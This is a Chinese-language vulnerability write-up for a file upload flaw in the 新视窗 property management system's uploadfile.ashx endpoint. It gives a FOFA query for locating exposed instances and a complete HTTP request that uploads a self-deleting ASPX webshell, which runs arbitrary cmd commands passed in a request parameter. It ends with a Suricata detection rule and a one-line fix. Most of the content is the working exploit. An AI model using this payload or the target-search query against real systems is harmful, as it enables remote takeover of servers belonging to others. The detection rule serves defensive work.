# 新视窗新一代物业管理系统 uploadfile.ashx 存在文件上传漏洞

新视窗新一代物业管理系统 uploadfile.ashx 存在文件上传漏洞，攻击者可执行任意命令导致服务器被控。

# 影响版本

新视窗新一代物业管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="BPMSite/ClientSupport/OCXInstall.aspx"

POC/EXP：

```
POST /script/uploadify/uploadfile.ashx?id=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWQPGtgGbo1eMeYgQ

------WebKitFormBoundaryWQPGtgGbo1eMeYgQ
Content-Disposition: form-data; name="Filedata" filename="1.aspx"
Content-Type: application/octet-stream

<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
------WebKitFormBoundaryWQPGtgGbo1eMeYgQ--
```

![image-20260821170003681](assets/image-20260821170003681.png)

![image-20260821170019045](assets/image-20260821170019045.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"新视窗物业管理系统 - /script/uploadify/uploadfile.ashx 文件上传漏洞 (ASPX Webshell)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/script/uploadify/uploadfile.ashx";
        fast_pattern;
    http.content_type; content:"multipart/form-data";
    http.request_body;
        content:"filename="; nocase;
        content:".aspx"; distance:0; nocase;
        content:"ProcessStartInfo"; distance:0; nocase;
        content:"cmd"; distance:0; nocase;
    metadata:
        service http,
        affected_product "新视窗新一代物业管理系统",
        vulnerability_type "Unrestricted File Upload -> RCE",
        severity "critical";
    classtype:web-application-attack;
    sid:1000727;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
